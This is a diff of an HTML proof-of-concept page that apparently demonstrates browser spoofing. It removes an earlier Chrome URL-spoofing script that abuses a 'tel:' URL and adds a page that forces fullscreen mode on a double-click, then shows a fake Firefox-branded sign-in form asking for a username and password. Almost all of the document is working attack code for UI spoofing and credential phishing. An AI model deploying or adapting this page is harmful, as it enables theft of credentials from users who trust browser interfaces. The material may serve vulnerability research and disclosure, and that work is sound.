@@ -1,13 +1,69 @@
 <html>
-<head>
-    <title>Chrome Url Spoofing (bypass dangerous website) vulnerability</title>
-</head>
-<script>
-function pwn() {
-    w = window.open();
-    w.document.write('<p>Calling Google</p>'));
-    setTimeout("w.location.replace('tel:https://google.com');",5);
-}
-</script>
-<h1><button href="#" onclick="pwn()">CLICK TO CALL</button></h1>
+<head></head>
+<body id="xx">
+  <div style="margin-top: -10px;">
+    <select id="selecf" onclick="fullscreen()" style="margin-left: 0px; width: 1500px; font-size: 50; height: 200px;">
+      <option style="height: 100px;">             </option>
+    </select>
+  </div>
+
+  <div>
+    <h1>Double Click</h1>
+  </div>
+
+  <div id="imageContainer" style="background-color: #fff; display: none; text-align: center; margin-top: 20px;">
+	<img src="top.png" class="header" />
+  <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
+    <div
+      style="background-color: #fff; padding: 50px; box-shadow: 0px 0px 10px rgba(0,0,0,0.2); border-radius: 10px;width: 25vw;">
+      <img src="https://www.mozilla.org/media/protocol/img/logos/firefox/logo.fedb52c912d6.svg"
+        style="display: block; margin: 0 auto;" />
+
+      <form style="margin-top: 50px;">
+        <div style="margin-bottom: 20px;">
+          <input type="text" id="username" name="username" placeholder="Username"
+            style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;">
+        </div>
+        <div style="margin-bottom: 20px;">
+          <input type="password" id="password" name="password" placeholder="Password"
+            style="width: 100%; padding: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc;">
+        </div>
+        <input type="submit" value="Sign In"
+          style="width: 100%; padding: 10px; background-color: #3f51b5; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;">
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function fullscreen() {
+      document.getElementById("xx").requestFullscreen().then(function() {
+       
+      }).catch(function(error) {
+        console.log(error.message);
+      });
+    }
+
+    var t = 0;
+    document.onmousedown = function(e) {
+      t = t + 1;
+
+      if (t == 1) {
+        document.getElementById("xx").requestFullscreen().then(function() {
+         
+        }).catch(function(error) {
+          console.log(error.message);
+        });
+      }
+
+      if (t == 2) {
+      
+        document.getElementById("selecf").style.marginTop = "-250px";
+        document.getElementById("imageContainer").style.display = "block"; 
+      }
+
+    
+    };
+  </script>
+
+</body>
 </html>
